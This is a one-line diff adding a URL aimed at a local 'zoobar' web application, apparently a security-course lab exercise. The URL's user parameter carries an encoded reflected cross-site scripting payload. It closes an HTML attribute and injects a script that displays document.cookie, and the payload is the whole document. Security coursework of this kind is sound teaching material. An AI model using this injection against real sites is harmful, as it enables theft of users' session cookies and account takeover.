@@ -1,0 +1,1 @@
+http://localhost:8080/zoobar/index.cgi/users?user=%22%20size%3D10%3E%3Cscript%3Ealert(document.cookie)%3B%3C%2Fscript%3E%0A&random=1234
